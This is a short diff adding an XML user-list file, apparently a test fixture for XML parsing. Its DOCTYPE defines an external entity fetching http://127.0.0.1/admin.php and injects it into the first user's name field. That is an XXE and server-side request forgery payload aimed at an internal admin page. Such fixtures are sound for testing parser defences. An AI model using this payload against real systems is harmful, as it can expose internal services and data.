@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+  <!ENTITY readme SYSTEM "http://127.0.0.1/admin.php">
+]>
+<users>
+    <user>
+        <name>&readme;</name>
+        <email>john.doe@example.com</email>
+        <phone>123456789</phone>
+    </user>
+    <user>
+        <name>Jane Smith</name>
+        <email>jane.smith@example.com</email>
+        <phone>987654321</phone>
+    </user>
+</users>
